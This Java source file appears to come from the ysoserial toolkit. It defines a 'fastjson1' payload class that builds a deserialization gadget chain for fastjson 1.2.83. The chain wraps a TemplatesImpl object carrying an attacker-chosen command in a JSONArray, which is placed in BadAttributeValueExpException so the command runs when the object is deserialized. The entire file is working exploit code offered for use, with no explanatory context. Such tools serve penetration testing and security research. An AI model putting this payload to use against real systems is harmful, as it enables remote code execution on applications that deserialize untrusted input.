package ysoserial.payloads;

import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"com.alibaba:fastjson:1.2.83"})
@Authors({Authors.ERR0R233})
public class fastjson1 extends PayloadRunner implements ObjectPayload<Object> {
    public Object getObject(final String command) throws Exception{
        Object templatesImpl = Gadgets.createTemplatesImpl(command);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templatesImpl);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException, "val", jsonArray);
        return badAttributeValueExpException;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(fastjson1.class, args);
    }
}
